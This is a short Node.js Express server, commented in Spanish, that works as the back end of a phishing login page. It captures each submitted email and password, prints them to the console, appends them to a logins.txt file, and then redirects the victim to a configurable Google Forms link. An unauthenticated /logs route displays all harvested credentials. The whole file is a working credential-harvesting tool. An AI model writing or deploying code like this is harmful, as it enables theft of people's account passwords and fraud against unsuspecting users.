// 1. Importar los módulos necesarios
const express = require('express');
const path = require('path');
const fs = require('fs'); // <-- IMPORTANTE: agregamos fs

// 2. Crear una aplicación de Express
const app = express();

// 3. Definir el puerto
const port = process.env.PORT || 3000;

// 4. Middleware para procesar datos del formulario
app.use(express.urlencoded({ extended: true }));

// 5. Servir archivos estáticos desde la carpeta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// 6. 🔴 CAMBIA ESTE LINK POR EL QUE QUIERAS 🔴
const LINK_REDIRECCION = 'https://forms.gle/98noPgZxJ3Ptzsjw7';

// 7. Función para guardar en archivo .txt
function guardarEnArchivo(email, password) {
    const timestamp = new Date().toISOString();
    const linea = `[${timestamp}] Email: ${email} | Contraseña: ${password}\n`;
    
    // Guardar en archivo 'logins.txt' (se crea automáticamente si no existe)
    fs.appendFile('logins.txt', linea, (err) => {
        if (err) {
            console.error('❌ Error al guardar en archivo:', err);
        } else {
            console.log('✅ Datos guardados en logins.txt');
        }
    });
}

// 8. Ruta para procesar el formulario
app.post('/procesar', (req, res) => {
    const email = req.body.email;
    const password = req.body.pass;

    // Mostrar en consola (sigue funcionando)
    console.log('--- NUEVO INTENTO DE LOGIN ---');
    console.log('📧 Email:', email);
    console.log('🔑 Contraseña:', password);
    console.log('➡️ Redirigiendo a:', LINK_REDIRECCION);
    console.log('-------------------------------');

    // 🔴 GUARDAR EN ARCHIVO 🔴
    guardarEnArchivo(email, password);

    // 🔴 REDIRIGIR AL LINK ELEGIDO
    res.redirect(LINK_REDIRECCION);
});

// 9. (Opcional) Ruta para ver los logs guardados
app.get('/logs', (req, res) => {
    fs.readFile('logins.txt', 'utf8', (err, data) => {
        if (err) {
            res.send('No hay logs aún');
        } else {
            res.send(`<pre>${data}</pre>`);
        }
    });
});

// 10. Iniciar el servidor
app.listen(port, () => {
    console.log(`🚀 Servidor corriendo en http://localhost:${port}`);
    console.log(`➡️ Después del login redirigirá a: ${LINK_REDIRECCION}`);
    console.log('📝 Los datos se guardan en logins.txt');
});